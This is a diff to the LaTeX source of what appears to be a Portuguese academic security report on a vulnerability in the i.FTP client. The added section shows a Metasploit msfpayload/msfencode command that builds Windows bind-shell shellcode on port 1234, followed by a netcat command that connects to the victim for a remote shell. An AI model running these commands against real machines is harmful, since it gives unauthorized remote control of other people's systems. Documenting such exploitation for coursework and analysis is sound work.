@@ -9,6 +9,7 @@
 \usepackage[hypcap]{caption} % makes \ref point to top of figures and tables
 \usepackage{amsmath}
 \usepackage[nottoc,numbib]{tocbibind}	% adds Biliography to index
+\usepackage{listings}
 %\usepackage[margin=3.3cm]{geometry}
 
 \begin{document}
@@ -141,6 +142,30 @@ Média.
 	\item Tentar eliminar a vulnerabilidade;
 	\item Conclusão do presente documento.
 \end{itemize}
+
+Decidiu-se aplicar uma \textit{exploit} que permitisse ter acesso remoto à máquina atacada. Para isso gerou-se um novo \textit{shellcode} com o seguinte comando:
+
+\begin{lstlisting}
+   ruby msfpayload windows/shell\_bind\_tcp EXITFUNC=seh
+     LPORT=1234 R | ruby msfencode -a x86
+     -b `\x00\x0a\x0d\x26' -t c
+\end{lstlisting}
+
+%	\texttt{ruby msfpayload windows/shell\_bind\_tcp EXITFUNC=seh \\ LPORT=1234 R | ruby msfencode -a x86 -b `\textbackslash x00\textbackslash x0a\textbackslash x0d\textbackslash x26' -t c}
+
+que abre um porto TCP para a shell da máquina atacada no porto 1234. O atacante tem apenas que se ligar a esse porto para ter acesso à máquina:
+
+\begin{lstlisting}
+   nc a.b.c.d 1234
+\end{lstlisting}
+
+O resultado disto pode ser visto na Figura~\ref{fig:remote_shell}. Correndo o comando \texttt{whoami} é possível verificar que a shell está a ser corrida como o user que lançou o i.FTP.
+
+\begin{figure}[H]
+	\includegraphics[width=\linewidth]{remote_shell}
+	\caption{Acesso remoto à máquina atacada}
+	\label{fig:remote_shell}
+\end{figure}
 
 \section{Análise STRIDE}
 
